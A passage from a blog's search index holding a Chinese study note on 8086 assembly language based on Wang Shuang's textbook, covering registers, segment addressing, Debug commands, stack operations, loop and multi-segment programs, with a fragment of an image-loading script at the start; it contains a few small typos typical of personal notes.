.forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编语言</title>
      <link href="/posts/huibian/"/>
      <url>/posts/huibian/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p>这篇文章，记录下学习汇编的过程，记录一些需要记忆的知识。</p><a id="more"></a><blockquote><p>本文是基于《汇编语言》（王爽 著）来写的，</p></blockquote><h1 id="基础知识"><a class="markdownIt-Anchor" href="#基础知识"></a> 基础知识</h1><h2 id="机器语言"><a class="markdownIt-Anchor" href="#机器语言"></a> 机器语言</h2><p>说汇编语言之前，先简单说说机器语言：机器语言是机器指令的集合。机器指令展开来讲就是一台机器执行的命令。像电子计算机，机器指令就是一列一列的二进制数字，计算机可以处理这些数据进行运算。</p><h2 id="汇编语言"><a class="markdownIt-Anchor" href="#汇编语言"></a> 汇编语言</h2><h3 id="汇编语言的产生"><a class="markdownIt-Anchor" href="#汇编语言的产生"></a> 汇编语言的产生</h3><p>不难看出，机器语言无论是书写还是计算都很麻烦，也难于辨别和记忆，所以产生了汇编语言。</p><p>汇编语言的主体是汇编指令，这种指令有别于机器指令，在于它便于书写和记忆。</p><p><em><strong>例如：</strong></em></p><p><em><strong>操作：寄存器BX的内容送到AX中</strong></em></p><p><em><strong>机器指令：1000100111011000</strong></em></p><p><em><strong>汇编指令：mov ax,bx</strong></em></p><p>汇编语言的方便之处很容易看出了吧</p><h3 id="汇编语言的组成"><a class="markdownIt-Anchor" href="#汇编语言的组成"></a> 汇编语言的组成</h3><p>汇编语言有3类指令组成：</p><p>1、汇编指令：机器码的助记符，有相应的机器码。</p><p>2、伪指令：没有对应的机器码，由编译器执行，计算机并不执行。</p><p>3、其他符号：例如+、-、*、/等，由编译器识别，没有对应的机器码。</p><h1 id="寄存器"><a class="markdownIt-Anchor" href="#寄存器"></a> 寄存器</h1><h2 id="通用寄存器"><a class="markdownIt-Anchor" href="#通用寄存器"></a> 通用寄存器</h2><p>8086CPU的所有寄存器都是16位的，可以存放2个字节。</p><p>通用寄存器有4个：AX、BX、CX、DX，每一个又可以分为两个可以独立使用的8位寄存器来使用：</p><p>● AX可以分为AH和AL;</p><p>● BX可以分为BH和BL;</p><p>● CX可以分为CH和CL;</p><p>● DX可以分为DH和DL;</p><blockquote><p>H是高位，L是低位，AH寄存器存储的是AX的高8位，AL寄存器存储的是AX的低8位</p></blockquote><blockquote><p>寄存器的名称在编码的时候大小写均可以</p></blockquote><h2 id="字"><a class="markdownIt-Anchor" href="#字"></a> 字</h2><p>● 字节： 记为byte，一个字节由8个bit组成，可以存在8位寄存器中。</p><p>● 字： 记为word，一个字由两个字节组成，分别称为这个字的高位字节和低位字节。</p><h2 id="几条汇编指令"><a class="markdownIt-Anchor" href="#几条汇编指令"></a> 几条汇编指令</h2><table><thead><tr><th style="text-align:center">汇编指令</th><th style="text-align:center">控制CPU完成的操作</th><th style="text-align:center">高级语言语法描述</th></tr></thead><tbody><tr><td style="text-align:center">mov ax,1000H</td><td style="text-align:center">将1000H送入寄存器AX</td><td style="text-align:center">AX=1000H</td></tr><tr><td style="text-align:center">mov ax,bx</td><td style="text-align:center">将寄存器BX中的数据送入寄存器AX中</td><td style="text-align:center">AX=BX</td></tr><tr><td style="text-align:center">add ax,bx</td><td style="text-align:center">将AX和BX中的数值相加，结果存在AX</td><td style="text-align:center">AX=AX+BX</td></tr></tbody></table><h2 id="物理地址"><a class="markdownIt-Anchor" href="#物理地址"></a> 物理地址</h2><p>CPU中的相关部件有两个16位地址：一个称为段地址，另一个称为偏移地址；</p><p><strong>物理地址 = 段地址 x 16 + 偏移地址 ⇔ 物理地址 = 基础地址 + 偏移地址</strong></p><h2 id="段寄存器"><a class="markdownIt-Anchor" href="#段寄存器"></a> 段寄存器</h2><p>8086CPU有4个段寄存器：<strong>CS、DS、SS、ES</strong></p><h2 id="cs和ip"><a class="markdownIt-Anchor" href="#cs和ip"></a> CS和IP</h2><p>CS和IP是8086CPU中两个最关键的寄存器，它们指示了CPU当前要读取指令的地址。CS为代码段寄存器，IP为指针指令寄存器。</p><p>任意时刻，CPU将CS：IP中指向的内容当作指令执行。</p><h2 id="修改cs和ip得到指令"><a class="markdownIt-Anchor" href="#修改cs和ip得到指令"></a> 修改CS和IP得到指令</h2><p>前面提到mov指令可以修改寄存器的值，但是CS和IP的值不能被修改，现在介绍一种新的指令：<strong>jmp指令</strong></p><p>用法：</p><p>● jmp 段地址：偏移地址。例如：jmp 1234：3，执行后CS=1234H，IP=0003H，CPU将从12343H处读取指令。</p><p>● jmp 某一合法寄存器，功能：用寄存器的值修改IP。例如：ax=1000H，IP=0001H，jmp ax，执行后IP=1000H</p><h1 id="dosbox的使用"><a class="markdownIt-Anchor" href="#dosbox的使用"></a> DOSBox的使用</h1><p>DOSBox是一个模拟dos系统的软件，学习汇编可以使用它来完成编译、连接等过程。</p><h2 id="debug"><a class="markdownIt-Anchor" href="#debug"></a> Debug</h2><p>Debug是调试工具，使用它可以查看CPU中各种寄存器中的内容、内存情况和在机器码级跟踪程序的运行</p><h2 id="debug功能"><a class="markdownIt-Anchor" href="#debug功能"></a> Debug功能</h2><p>● 用Debug的R命令查看、改变CPU寄存器的内容</p><p>● 用Debug的D命令查看内存中的内容</p><p>● 用Debug的E命令改写内存中的内容</p><p>● 用Debug的U命令将内存中的机器指令翻译成汇编指令</p><p>● 用Debug的T命令执行一条机器指令</p><p>● 用Debug的A命令以汇编指令的格式在内存中写入一条机器指令</p><h2 id="dosbox使用方法"><a class="markdownIt-Anchor" href="#dosbox使用方法"></a> DOSBox使用方法</h2><p>DOSBox使用方法不难，网上有很多教程，这里就不多讲解了</p><h1 id="寄存器内存访问"><a class="markdownIt-Anchor" href="#寄存器内存访问"></a> 寄存器（内存访问）</h1><h2 id="ds和address"><a class="markdownIt-Anchor" href="#ds和address"></a> DS和[address]</h2><p>CPU要读取一个内存单元的时候，必须先给出这个内存单元的地址，在8086CPU中，内存地址由段地址个偏移地址组成，8086CPU中有一个DS寄存器，存放段地址，而常见的“[]”这种格式，表示一个内存单元，里面存放的是偏移地址；</p><p>例如：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov bx，1000H</span><br><span class="line"></span><br><span class="line">mov ds，bx</span><br><span class="line"></span><br><span class="line">mov ax，[0]</span><br></pre></td></tr></tbody></table></figure><p>这三步指令将10000H（1000：0）中的数据读到ax中</p><blockquote><p>这里不能直接用mov ds，1000H，8086CPU不支持直接将数据送入段寄存器中，必须通过其他寄存器进行中转才行。</p></blockquote><h2 id="mov-add-sub指令"><a class="markdownIt-Anchor" href="#mov-add-sub指令"></a> mov、add、sub指令</h2><p>前面说到过mov指令和add指令，那就简单说说sub指令：</p><table><thead><tr><th style="text-align:center">汇编指令</th><th style="text-align:center">控制CPU完成的操作</th><th style="text-align:center">高级语言语法描述</th></tr></thead><tbody><tr><td style="text-align:center">sub ax,bx</td><td style="text-align:center">将AX和BX中的数值相加，结果存在AX</td><td style="text-align:center">AX=AX-BX</td></tr></tbody></table><p>下面是一些常用的格式：</p><blockquote><p>mov/add/sub 寄存器，数据           例如：mov/add/sub ax,8</p><p>mov/add/sub 寄存器，寄存器       例如：mov/add/sub ax,bx</p><p>mov/add/sub 寄存器，内存单元   例如：mov/add/sub ax,[0]</p><p>mov/add/sub 内存单元，寄存器   例如：mov/add/sub [0],ax</p><p>mov 段寄存器，寄存器                   例如：mov ds,ax</p></blockquote><h2 id="cpu提供的栈机制"><a class="markdownIt-Anchor" href="#cpu提供的栈机制"></a> CPU提供的栈机制</h2><p>8086CPU提供入栈和出栈的指令，最基本的是push(入栈)和pop(出栈)：</p><table><thead><tr><th style="text-align:center">汇编指令</th><th style="text-align:center">控制CPU完成的操作</th><th style="text-align:center">高级语言语法描述</th></tr></thead><tbody><tr><td style="text-align:center">push ax</td><td style="text-align:center">将寄存器ax中的值送入栈中</td><td style="text-align:center">—</td></tr><tr><td style="text-align:center">pop ax</td><td style="text-align:center">从栈顶取出数据送入ax中</td><td style="text-align:center">—</td></tr></tbody></table><p>8086CPU在寻找当前栈顶位置时提供了一种方法：</p><p>8086CPU中有两个寄存器SS和SP，SS存放栈顶的段地址，SP存放栈顶元素的偏移地址。</p><p>任意时刻，SS：SP指向栈顶元素。当执行push和pop指令时，CPU就从SS和SP中获取栈顶的地址。</p><h3 id="push过程"><a class="markdownIt-Anchor" href="#push过程"></a> push过程</h3><p>push ax的执行，分为以下两部进行：</p><p>1、SP=SP-2，SS：SP指向当前栈顶前面的单元，以当前栈顶前面的单元为新的栈顶。</p><p>2、将ax中的内容送到SS：SP指向的内存单元处，SS：SP此时指向新的栈顶。</p><h3 id="pop过程"><a class="markdownIt-Anchor" href="#pop过程"></a> pop过程</h3><p>pop ax的执行和push正好相反，也是分为两部执行：</p><p>1、将SS：SP指向的内存单元处的数据送入ax中。</p><p>2、SP=SP+2，SS：SP指向当前栈顶下面的单元，以当前栈顶下面的单元为新的栈顶。</p><h2 id="栈顶超界问题"><a class="markdownIt-Anchor" href="#栈顶超界问题"></a> 栈顶超界问题</h2><p>当一个栈满了之后，此时若执行push命令，则会发生栈满情况，这些栈空间很可能存放很多有用的数据，代码等，是很危险的情况。</p><p>当然，若栈为空，执行pop命令也会栈越界。</p><p>所以在实际工作中，一定要注意栈越界情况，尽可能的用到最大的栈空间。</p><h1 id="第一个程序"><a class="markdownIt-Anchor" href="#第一个程序"></a> 第一个程序</h1><h2 id="一个小程序"><a class="markdownIt-Anchor" href="#一个小程序"></a> 一个小程序</h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line"></span><br><span class="line">codesg segment</span><br><span class="line">    mov ax,0123H</span><br><span class="line">    mov bx,0456H</span><br><span class="line">    add ax,bx</span><br><span class="line">    add ax,ax</span><br><span class="line">    </span><br><span class="line">    mov ax,4c00H</span><br><span class="line">    int 21H</span><br><span class="line">codesg ends</span><br><span class="line">end</span><br></pre></td></tr></tbody></table></figure><p>这是一段简单的汇编程序，先说明下各部分的含义：</p><h2 id="各部分的含义"><a class="markdownIt-Anchor" href="#各部分的含义"></a> 各部分的含义</h2><p><strong>1、伪指令</strong></p><p>在汇编语言源程序中，包含两种指令，一种是汇编指令，一种是伪指令。</p><p>汇编指令是有对应的机器码的指令，可以被编译为机器指令，最终被CPU所执行；而伪指令没有对应的机器指令，最终不被CPU所执行而被编译器执行。</p><p>上面程序中有3中伪指令：</p><p>● <strong>segment</strong>和<strong>ends</strong>是一对成对使用的伪指令，这是在可被编译器编译的汇编程序中必须用到的伪指令。功能是定义一个段，<strong>segment</strong>和<strong>ends</strong>分别说明一个段的开始和结束。</p><p>一个程序中通常会有多个段，代码段只是其中一种。</p><p>● <strong>end</strong>是一个汇编程序的结束标记，编译器在编译汇编程序的过程中，碰到<strong>end</strong>就会结束。</p><p>一定要记得在结尾加上<strong>end</strong>，否则，编译器无法知道程序在何处结束</p><p>● <strong>assume</strong>含义是“假设”，它假设某一段寄存器和程序中的某一个用<strong>segment…ends</strong>定义的段相关联，通过assume说明这种关联。</p><p><strong>2、标号</strong></p><p>汇编源程序中，除了汇编指令和伪指令外，还有一些标号，例如“codesg”。一个标号指代了一个地址。比如codesg在segment的前面，作为一个段的名称，这个段的名称最终被编译、连接程序处理为一个段的段地址。</p><p><strong>3、程序的结构</strong></p><p>(1) 我们要定义一个段，名称为abc</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">abc segment</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">abc ends</span><br></pre></td></tr></tbody></table></figure><p>(2) 在这个段中写入汇编指令，来实现我们的任务</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">abc segment</span><br><span class="line">    mov ax,2</span><br><span class="line">    add ax,ax</span><br><span class="line">abc ends</span><br></pre></td></tr></tbody></table></figure><p>(3) 指出程序在何处结束</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">abc segment</span><br><span class="line">    mov ax,2</span><br><span class="line">    add ax,ax</span><br><span class="line">abc ends</span><br><span class="line">end</span><br></pre></td></tr></tbody></table></figure><p>(4) abc被当做代码段来用，所以，应该将abc和cs联系起来</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">assume cs:abc</span><br><span class="line">abc segment</span><br><span class="line">    mov ax,2</span><br><span class="line">    add ax,ax</span><br><span class="line">abc ends</span><br><span class="line">end</span><br></pre></td></tr></tbody></table></figure><p><strong>4、程序返回</strong></p><p>一个程序结束后，CPU的控制权交还给使它得以运行的程序，我们称这个过程为：<strong>程序返回</strong></p><p>返回方法：在程序的末尾添加返回的程序段：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov ax 4c00H</span><br><span class="line">int 21H</span><br></pre></td></tr></tbody></table></figure><p>与结束相关的概念：</p><table><thead><tr><th style="text-align:center">目的</th><th style="text-align:center">相关指令</th><th style="text-align:center">指令性质</th><th style="text-align:center">指令执行者</th></tr></thead><tbody><tr><td style="text-align:center">通知编译器一个段结束</td><td style="text-align:center">段名 ends</td><td style="text-align:center">伪指令</td><td style="text-align:center">编译时，由编译器执行</td></tr><tr><td style="text-align:center">通知编译器程序结束</td><td style="text-align:center">end</td><td style="text-align:center">伪指令</td><td style="text-align:center">编译时，由编译器执行</td></tr><tr><td style="text-align:center">程序返回</td><td style="text-align:center">mov ax,4c00H  int 21H</td><td style="text-align:center">汇编指令</td><td style="text-align:center">执行时，由CPU执行</td></tr></tbody></table><h2 id="程序的执行"><a class="markdownIt-Anchor" href="#程序的执行"></a> 程序的执行</h2><p>一个程序从开始到执行分为以下几步：</p><p>● 编辑源程序</p><p>● 编译</p><p>● 连接</p><p>● .exe的执行</p><p>这些步骤可以用<strong>DOSBox</strong>进行，具体方法就不多说了</p><h1 id="bx和loop指令"><a class="markdownIt-Anchor" href="#bx和loop指令"></a> [BX]和loop指令</h1><p>1、[bx]</p><p>[bx]和[0]类似，都表示一个内存单元，[bx]的偏移地址在bx中，例如：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov ax,[bx]</span><br></pre></td></tr></tbody></table></figure><p>将一个内存单元的内容送入ax，这个内存单元偏移地址在bx，段地址在ds中。</p><p>2、loop</p><p><strong>loop</strong>有循环的意思，显然这个指令和循环有关。</p><p>3、描述性符号"()"</p><p>"()"表示一个寄存器或者一个内存单元的内容，例如：</p><p>(ax)表示ax中的内容；(20000H)表示内存20000H单元的内容</p><p>4、约定符号idata表示常量</p><p>用idata表示一个常量，例如：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ax,[idata]</span><br><span class="line"></span><br><span class="line">mov bx,idata</span><br></pre></td></tr></tbody></table></figure><p>第一句就代表mov ax,[1]、mov ax,[2]、mov ax,[3]…</p><p>第二句就代表mov bx,1、mov bx,2、mov bx,3</p><h2 id="bx"><a class="markdownIt-Anchor" href="#bx"></a> [BX]</h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov ax,[bx]</span><br></pre></td></tr></tbody></table></figure><p>功能：bx中存放的数据作为一个偏移地址EA，段地址SA默认在ds中，将ax中的数据送入ax中，即：(ax)=((ds)*16+(bx))</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov [bx],ax</span><br></pre></td></tr></tbody></table></figure><p>功能：bx中存放的数据作为一个偏移地址EA，段地址SA默认在ds中，将ax中的数据送入内存SA：EA处，即：((ds)*16+(bx)=(ax))</p><p><strong>inc指令：</strong></p><table><thead><tr><th style="text-align:center">汇编指令</th><th style="text-align:center">控制CPU完成的操作</th><th style="text-align:center">高级语言语法描述</th></tr></thead><tbody><tr><td style="text-align:center">inc ax</td><td style="text-align:center">ax中的内容加一</td><td style="text-align:center">ax++</td></tr></tbody></table><h2 id="loop指令"><a class="markdownIt-Anchor" href="#loop指令"></a> loop指令</h2><p>loop指令的格式是：loop 标号，需要进行两部操作：</p><p>● (cx)=(cx)-1</p><p>● 判断cx的值，不为0则转至标号处执行程序，如果为0则向下执行</p><h3 id="编程举例"><a class="markdownIt-Anchor" href="#编程举例"></a> 编程举例</h3><p>若要计算2^3的值，你可能想到2×2×2，在汇编语言中我们知道没有’×’这个符号，那要怎么解决呢？前面讲过的add指令就派上用场了：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ax,2</span><br><span class="line">add ax,ax</span><br><span class="line">add ax,ax</span><br></pre></td></tr></tbody></table></figure><p>通过这样的加法运算，可以把乘方问题转化成加法来实现。</p><p>但是有一点注意的是，2^3次方还好说，如果2^100,1000次方，再用add指令就麻烦了，所以，我们引入了loop指令可以轻松解决这个问题：</p><p>例：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">    mov ax,2</span><br><span class="line">    mov cx,100</span><br><span class="line">S:  add ax,ax</span><br><span class="line">    loop s</span><br><span class="line">    </span><br><span class="line">    mov ax,4c00H</span><br><span class="line">    int 21H</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></tbody></table></figure><p><strong>一、分析：</strong></p><p>1、标号</p><p>汇编语言中，标号代表一个地址，上面程序中s就是一个标号，它实际上是标识了一个地址，这个地址有一条指令：add ax,ax</p><p>2、loop s</p><p>CPU执行loop s的时候进行两步操作：</p><p>● (cx)=(cx)-1</p><p>● 判断cx的值，不为0则转至标号处执行程序，如果为0则向下执行</p><p>3、上面程序执行了100次，实际上是计算2^101次方</p><p><strong>二、总结：</strong></p><p>cx和loop指令配合实现循环功能的3个要点：</p><p>● 在cx中存放循环次数</p><p>● loop指令中的标号所标识地址要在前面</p><p>● 要循环执行的程序段，要写在标号和loop指令的中间，框架如下：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">    mov cx,循环次数</span><br><span class="line">s:  </span><br><span class="line">    循环执行程序段</span><br><span class="line">    loop s</span><br></pre></td></tr></tbody></table></figure><h2 id="段前缀"><a class="markdownIt-Anchor" href="#段前缀"></a> 段前缀</h2><p>用于显式地指明内存单元的段地址的ds:，cs:，ss:，es:称为段前缀。</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov ax,ds/cs/ss/es:[bx]</span><br></pre></td></tr></tbody></table></figure><p>这行代码含义是：</p><p>将一个内存单元的内容送入ax，这个内存单元的长度为2个字节(字单元)，存放一个字，偏移地址在bx/cs/ss/es中，段地址在ds中</p><h1 id="包含多个段的程序"><a class="markdownIt-Anchor" href="#包含多个段的程序"></a> 包含多个段的程序</h1><p>前面我们只接触到了代码段，如果程序需要用其他空间来存放数据，就得使用其他的段。这一章，我们学习数据段、栈段、代码段</p><h2 id="在代码段中使用数据"><a class="markdownIt-Anchor" href="#在代码段中使用数据"></a> 在代码段中使用数据</h2><p>考虑这样一个问题，编程计算一下8个数据的和，结果存在ax寄存器中：</p><p>1,2,3,4,5,6,7,8，</p><p>在前面已经学习过了loop指令，因此肯定是希望用循环的方式进行数据的相加，所以，我们可以将数据存储在一组地址连续的内存单元中，通过指令送入。</p><p>具体方法：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">    dw 1,2,3,4,5,6,7,8</span><br><span class="line">    </span><br><span class="line">    mov bx,0</span><br><span class="line">    mov ax,0</span><br><span class="line">    mov cx,8</span><br><span class="line">  s:add ax,cs:[bx]</span><br><span class="line">    add bx,2</span><br><span class="line">    loop s</span><br><span class="line">    </span><br><span class="line">    mov ax,4c00h</span><br><span class="line">    int 21h</span><br><span class="line">    </span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></tbody></table></figure><p>说明：</p><p>程序中的"dw"的含义是定义字型数据，“dw"即"define word”，dw定义8个字型数据，占16个字节的内存空间。</p><p>程序在运行的时候CS中存放的是代码段的段地址，所以段地址是已知的了，那么，偏移地址是多少呢？dw定义的数据处于代码段的一开始，所以偏移地址为0。</p><p>程序中用bx存放加2递增的偏移地址，每次循环(bx)=(bx)+2，cs：bx指向下一个数据所在的字单元。</p><p>这样就完成了一系列的操作。</p><p><strong>在这里有个小问题：</strong></p><blockquote><p>程序运行的过程中，有时候会找不到程序的"入口"，这样一来，程序的逻辑就会混乱，运行也会出错。</p></blockquote><p>为了解决上面的问题，引入了新的模板：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">        ...</span><br><span class="line">        数据</span><br><span class="line">        ...</span><br><span class="line">start:</span><br><span class="line">        ...</span><br><span class="line">        代码</span><br><span class="line">        ...</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></tbody></table></figure><p><strong>end</strong>不仅仅可以通知编译器程序结束外，还可以通知编译器程序的入口在什么地方。</p><p>上面的模板中，<strong>end</strong>后面接了一个<strong>start</strong>，指明了程序的入口为<strong>start</strong>，编译器就从此处开始执行。</p><h2 id="在代码段中使用栈"><a class="markdownIt-Anchor" href="#在代码段中使用栈"></a> 在代码段中使用栈</h2><p>考虑这样一个问题，将下列一组数据逆序存放：</p><p>1,2,3,4,5,6,7,8</p><p>第一反应想到的是利用栈，因为入栈和出栈正好相反嘛。利用栈把定义的数据存放在cs:0~cs:F 单元中， 依次将这8个字单元中的数据入栈，再依次出栈到这8个字单元中，从而实现数据的逆序存放。</p><p>具体方法：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line">codesg segment</span><br><span class="line">    dw 1,2,3,4,5,6,7,8</span><br><span class="line">    dw 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 ;用dw定义16个字型数据，在程序加载后，将取得16个字的内存空间，存放着                                        ;16个数据,后面将这段空间当做栈来使用</span><br><span class="line">    </span><br><span class="line">start: mov ax,cs</span><br><span class="line">       mov ss,ax</span><br><span class="line">       mov sp,30h  ;将栈顶ss:sp指向cs:30</span><br><span class="line">       </span><br><span class="line">       mov bx,0</span><br><span class="line">       mov cx,8</span><br><span class="line">   s1: push cs:[bx]</span><br><span class="line">       add bx,2</span><br><span class="line">       loop s1     ;将代码段0~15个单元中的8个字型数据依次入栈</span><br><span class="line">       </span><br><span class="line">       mov bx,0</span><br><span class="line">       mov cx,8</span><br><span class="line">   s2: pop cs:[bx]</span><br><span class="line">       add bx,2</span><br><span class="line">       loop s2     ;依次出栈8个字型数据到代码段0~15个单元中</span><br><span class="line">       </span><br><span class="line">       mov ax,4c00h</span><br><span class="line">       int 21h</span><br><span class="line">       </span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></tbody></table></figure><p>这样就可以实现数据的逆序存放了</p><h2 id="将数据-代码-栈放入不同的段"><a class="markdownIt-Anchor" href="#将数据-代码-栈放入不同的段"></a> 将数据、代码、栈放入不同的段</h2><p>定义多个段：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">data segment</span><br><span class="line">    dw 1,2,3,4,5,6,7,8</span><br><span class="line">data ends</span><br><span class="line"></span><br><span class="line">stack segment</span><br><span class="line">    dw 0,0,0,0,0,0,0,0</span><br><span class="line">stack ends</span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line">start: mov ax,stack</span><br><span class="line">       mov ss,ax</span><br><span class="line">       mov sp,20h    ;设置栈顶ss:sp指向stack:20</span><br><span class="line">       </span><br><span class="line">       mov ax,data</span><br><span class="line">       mov ds,ax     ;ds指向data段</span><br><span class="line">code ends</span><br></pre></td></tr></tbody></table></figure><p>说明：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov ax,data ;这行指令的含义是将名称为data的段的段地址送入ax</span><br></pre></td></tr></tbody></table></figure><blockquote><p>mov ds,data 这行指令时错误的，8086CPU不允许将一个数值直接送入段寄存器中，如果程序中出现这行指令，将被编译器处理为一个表示段地址的数值</p></blockquote><p><strong>db、dw、dd的区别：</strong></p><blockquote><p>db定义字节类型变量，1个字节数据占1个字节单元，读完1个，偏移量+1</p><p>dw定义字节类型变量，1个字节数据占2个字节单元，读完1个，偏移量+2</p><p>dd定义字节类型变量，1个字节数据占4个字节单元，读完1个，偏移量+4</p></blockquote><h1 id="更灵活的定位内存地址的方法"><a class="markdownIt-Anchor" href="#更灵活的定位内存地址的方法"></a> 更灵活的定位内存地址的方法</h1><h2 id="and和or指令"><a class="markdownIt-Anchor" href="#and和or指令"></a> and和or指令</h2><h3 id="and指令"><a class="markdownIt-Anchor" href="#and指令"></a> and指令</h3><p>and指令：逻辑与指令，按位进行与运算</p><p>例如：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al,01100011B</span><br><span class="line">and al,00111011B</span><br></pre></td></tr></tbody></table></figure><p>执行后，al=00100011B</p><p>或运算的计算方法为：“一一得一，其余为零”</p><h3 id="or指令"><a class="markdownIt-Anchor" href="#or指令"></a> or指令</h3><p>or指令：逻辑或运算，按位进行或运算</p><p>例如：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al,01100011B</span><br><span class="line">or al,00111011B</span><br></pre></td></tr></tbody></table></figure><p>执行后，al=01111011B</p><p>或运算的计算方法为：“零零得零，其余为一”</p><blockquote><p>若要将一个操作对象的某一位设置成0，则用and指令，例如：将al第3位设置成0：and 